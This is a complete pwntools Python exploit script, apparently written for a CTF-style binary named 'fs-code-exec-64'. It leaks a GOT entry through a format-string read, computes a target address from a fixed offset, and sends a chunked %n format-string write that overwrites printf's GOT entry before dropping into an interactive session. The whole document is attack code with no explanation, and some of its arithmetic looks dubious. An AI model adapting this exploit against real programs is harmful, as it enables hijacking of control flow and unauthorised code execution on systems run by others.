from pwn import *
p = process("./fs-code-exec-64")

got_printf = p.elf.got['puts']

p.sendline( "%7$s0000"+ p64(got_printf))
p.recvuntil("llo ")
got_printf = p.elf.got['printf']
target_num = p.recvline()
target_num = u64(target_num[:8])
target_num = target_num - 0x2a300
target_addr = got_printf

front = target_num & 0xffff

back = (target_num >>16) - (front)
back = back & 0xffff

while back < 0:
    back += 0x10000

third = (target_num >> 32) - (front + back)
third = third & 0xffff


while third < 0:
    third += 0x10000

final = 0 - (front + back +third)
final = final & 0xffff 

while final < 0:
    final += 0x10000

payload = "%" + "%05d" % front + "x%12$n"
payload = payload + "%" + "%05d" % back + "x%13$n"
payload = payload + "%" + "%05d" % third + "x%14$n"
payload = payload + "%" + "%05d" % final + "x%15$n"
payload = payload + p64(target_addr) + p64(target_addr+2) + p64(target_addr+4) + p64(target_addr+6)

with open('x', 'w') as x:
    x.write(payload)

p.sendline(payload)

p.interactive()


